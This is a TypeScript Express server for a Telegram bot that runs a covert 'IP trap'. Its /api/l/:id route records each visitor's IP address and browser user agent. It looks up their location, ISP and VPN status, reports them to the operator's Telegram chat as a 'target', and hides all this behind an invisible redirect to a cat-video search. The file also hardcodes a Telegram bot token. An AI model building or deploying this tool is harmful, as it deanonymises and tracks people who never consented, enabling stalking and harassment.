import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import dotenv from "dotenv";
import { setupBot } from "./src/bot/index.js";
import { Bot } from "grammy";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // Start the bot asynchronously
  setupBot().catch(console.error);

  const token = process.env.BOT_TOKEN || "8597293888:AAGllUMlZCPYOjcy6BkHJTJLd3cEivVKW08"; 
  const botAlert = new Bot(token);

  app.get("/api/l/:id", async (req, res) => {
    const chatId = req.params.id;
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
    if (Array.isArray(ip)) ip = ip[0];
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    
    const ua = (req.headers['user-agent'] || "Неизвестно").toString();
    const isBot = ua.toLowerCase().includes("telegram") || ua.toLowerCase().includes("bot") || ua.toLowerCase().includes("spider");

    // Process tracking logic in background without keeping user waiting
    setImmediate(async () => {
       try {
           let geoinfo = "<i>Локация не определена (возможно приватный IP)</i>";
           // Fetch IP info
           const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,proxy,mobile,org,isp`);
           if(ipRes.status === 200) {
              const d: any = await ipRes.json();
              if(d.status === 'success') {
                geoinfo = `📍 <b>Локация:</b> ${d.country}, ${d.city}\n🏭 <b>Провайдер:</b> ${d.org || d.isp}\n🛡 <b>VPN/Proxy:</b> ${d.proxy ? 'Да' : 'Нет'}\n📱 <b>Мобильный:</b> ${d.mobile ? 'Да' : 'Нет'}`;
              }
           }
           
           let title = isBot 
             ? "🤖 <b>ПРЕДУПРЕЖДЕНИЕ: Ссылку проверил бот/Telegram!</b>\n<i>(Обычно Telegram автоматически сканирует ссылки для превью. Подождите, пока кликнет сам человек)</i>\n" 
             : "🚨 <b>ЦЕЛЬ ПЕРЕШЛА ПО IP-ЛОВУШКЕ!</b>\n";

           await botAlert.api.sendMessage(
               chatId, 
               `${title}\n📌 <b>IP адрес:</b> <code>${ip}</code>\n\n${geoinfo}\n\n🕵️ <b>Устройство (User-Agent):</b>\n<code>${ua}</code>`, 
               { parse_mode: "HTML" }
           );
       } catch(e) {
           console.error("Failed to process ip log", e);
       }
    });

    // Invisible redirect
    res.redirect("https://www.google.com/search?q=funny+cats");
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // In production, we also don't really have an SPA here since it's just a bot, 
    // but we can serve some static info.
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
